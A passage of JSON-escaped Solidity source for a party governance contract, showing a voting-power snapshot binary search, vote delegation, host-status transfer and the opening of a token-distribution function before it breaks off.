timestamp\n    ) public view returns (uint256 index) {\n        VotingPowerSnapshot[] storage snaps = _votingPowerSnapshotsByVoter[voter];\n\n        // Derived from Open Zeppelin binary search\n        // ref: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Checkpoints.sol#L39\n        uint256 high = snaps.length;\n        uint256 low = 0;\n        while (low < high) {\n            uint256 mid = (low + high) / 2;\n            if (snaps[mid].timestamp > timestamp) {\n                // Entry is too recent.\n                high = mid;\n            } else {\n                // Entry is older. This is our best guess for now.\n                low = mid + 1;\n            }\n        }\n\n        // Return `type(uint256).max` if no valid voting snapshots found.\n        return high == 0 ? type(uint256).max : high - 1;\n    }\n\n    /// @notice Pledge your intrinsic voting power to a new delegate, removing it from\n    ///         the old one (if any).\n    /// @param delegate The address to delegating voting power to.\n    function delegateVotingPower(address delegate) external onlyDelegateCall {\n        _adjustVotingPower(msg.sender, 0, delegate);\n        emit VotingPowerDelegated(msg.sender, delegate);\n    }\n\n    /// @notice Transfer party host status to another.\n    /// @param newPartyHost The address of the new host.\n    function abdicateHost(address newPartyHost) external onlyHost onlyDelegateCall {\n        // 0 is a special case burn address.\n        if (newPartyHost != address(0)) {\n            // Cannot transfer host status to an existing host.\n            if (isHost[newPartyHost]) {\n                revert InvalidNewHostError();\n            }\n            isHost[newPartyHost] = true;\n        }\n        isHost[msg.sender] = false;\n        emit HostStatusTransferred(msg.sender, newPartyHost);\n    }\n\n    /// @notice Create a token distribution by moving the party's entire balance\n    ///         to the `TokenDistributor` contract and immediately creating a\n    ///         distribution governed by this party.\n    /// @dev The `feeBps` and `feeRecipient` this party was created with will be\n    ///      propagated to the distribution. Party members are entitled to a\n    ///      share of the distribution's tokens proportionate to their relative\n    ///      voting power in this party (less the fee).\n    /// @dev Allow this to be called by the party itself for `FractionalizeProposal`.\n    /// @param tokenType The type of token to distribute.\n    /// @param token The address of the token to distribute.\n    /// @param tokenId The ID of the token to distribute. Currently unused but\n    ///                may be used in the future to support other distribution types.\n    /// @return distInfo The information about the created distribution.\n    function distribute(\n        uint256 amount,\n        ITokenDistributor.TokenType tokenType,\n        address token,\n        uint256 tokenId\n    )\n        external\n        onlyWhenNotGloballyDisabled\n        onlyDelegateCall\n        returns (ITokenDistributor.DistributionInfo memory distInfo)\n    {\n        // Ignore if the party is calling functions on itself, like with\n        // `FractionalizeProposal` and `DistributionProposal`.\n        if (msg.sender != address(this)) {\n            // Must not require a vote to create a distribution, otherwise\n            // distributions can only be created through a distribution\n            // proposal.\n            if (_getSharedProposalStorage().opts.distributionsRequireVote) {\n                revert DistributionsRequireVoteError();\n            }\n            // Must be an active member.\n            VotingPowerSnapshot memory snap = _getLastVotingPowerSnapshotForVote"
    }
  ]
}